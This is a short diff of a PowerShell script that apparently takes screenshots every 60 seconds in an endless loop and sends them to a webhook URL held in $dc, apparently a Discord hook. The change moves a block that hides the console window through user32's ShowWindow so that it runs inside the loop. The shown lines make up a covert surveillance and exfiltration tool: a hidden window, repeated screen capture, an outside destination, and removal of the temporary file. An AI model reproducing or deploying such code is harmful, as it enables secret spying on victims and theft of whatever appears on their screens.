@@ -1,11 +1,4 @@
 
-$HideWindow = 1
-If ($HideWindow -gt 0){
-$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
-add-type -name win -member $Import -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
-}
-
 While ($true){
 
 $hookurl = "$dc"
@@ -28,4 +21,11 @@ Start-Sleep 1
 Remove-Item -Path $filett
 
 Start-Sleep 60 # change to whatever interval you would like beetween screenshots
+
+# HIDE THE WINDOW - Change to 0 to show the console window
+$HideWindow = 1
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 }
